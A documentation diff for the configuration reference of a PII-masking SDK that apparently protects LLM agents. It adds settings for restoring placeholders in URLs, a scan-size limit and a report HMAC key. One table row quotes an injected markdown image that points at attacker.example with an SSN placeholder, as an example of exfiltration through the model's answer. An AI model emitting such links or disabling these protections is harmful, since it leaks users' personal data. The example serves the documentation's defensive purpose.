@@ -29,7 +29,8 @@ runs after `import taintward`.
 | variable | type | default | meaning | read in |
 |---|---|---|---|---|
 | `TAINTWARD_DRY_RUN` | flag | off | audit mode for the SDK: violations are recorded (`taintward.dry_run=true`) but sinks get the raw input, including the LLM. Spans are still masked. See [Audit mode first, then enforce](../recipes/audit-then-enforce.md) | `taintward/sdk/instrumentation.py` |
-| `TAINTWARD_MASK_IN_SDK` | flag | on | mask tool input and output stored on spans inside the process. Turn off only when a trusted sidecar collector on the same host does the masking | `taintward/sdk/instrumentation.py` |
+| `TAINTWARD_MASK_IN_SDK` | flag | on | mask tool input stored on spans inside the process. Turn off only when a trusted sidecar collector on the same host does the masking. Tool output is masked in the process either way, because the collector only knows regex types | `taintward/sdk/instrumentation.py` |
+| `TAINTWARD_RESTORE_IN_URLS` | flag | off | also restore placeholders inside link and image addresses in the model's answer. Off, an injected `![x](https://attacker.example/?d=<SSN_1>)` keeps the placeholder. Same as `Ward(placeholder_restore_in_urls=True)` and the TypeScript `restoreInUrls` option. Read on each new placeholder map | `taintward/sdk/placeholders.py` |
 | `TAINTWARD_FAIL_CLOSED` | flag | off | refuse calls to `external`, `llm`, `log` and `rag` sinks while detection is degraded (spaCy or Presidio failed to load). The SDK raises `DetectionDegradedError`; the gateway returns an MCP error | `taintward/sdk/instrumentation.py`, `taintward/gateway/server.py` |
 
 ### SDK: detection
@@ -38,6 +39,7 @@ runs after `import taintward`.
 |---|---|---|---|---|
 | `TAINTWARD_PII_EXTRA_TYPES` | comma list | empty | entity types that are ignored by default and should count as PII again. The ignored set is `DATE_TIME`, `ORGANIZATION`, `URL`, `NRP`, `MEDICAL_LICENSE`. Example: `DATE_TIME,URL` | `taintward/sdk/detect.py` |
 | `TAINTWARD_DETECT_CACHE_SIZE` | integer | `4096` | entries in the per-value detection cache (hashes only, never raw text). `0` turns the cache off | `taintward/sdk/detect.py` |
+| `TAINTWARD_DETECT_MAX_CHARS` | integer | `500000` | longest value that is scanned. A longer value is not scanned and is treated as one secret (`OVERSIZE_VALUE`): masked for tools and logs, `<TOO_LARGE_1>` for the model. `0` turns the limit off. Read on each call | `taintward/sdk/detect.py` |
 
 ### Keys and the token vault
 
@@ -80,6 +82,7 @@ settings.
 | `TAINTWARD_EVIDENCE_KEY` | PEM text or 64 hex chars | unset | the private key itself; used when neither `--private-key` nor `TAINTWARD_EVIDENCE_KEY_FILE` is set | `taintward/evidence/checkpoint.py` |
 | `TAINTWARD_EVIDENCE_PUBLIC_KEY_FILE` | path | unset | public key (PEM) for verification, used when `--public-key` is not given | `taintward/evidence/checkpoint.py` |
 | `TAINTWARD_EVIDENCE_PUBLIC_KEY` | PEM text or 64 hex chars | unset | the public key itself | `taintward/evidence/checkpoint.py` |
+| `TAINTWARD_REPORT_KEY` | string | unset: a new random key per report | secret key for the HMAC fingerprints of findings in the report. Set it to match fingerprints across reports; keep it secret, since with it a fingerprint can be checked against guesses | `taintward/evidence/report.py` |
 
 ### Collector image
 
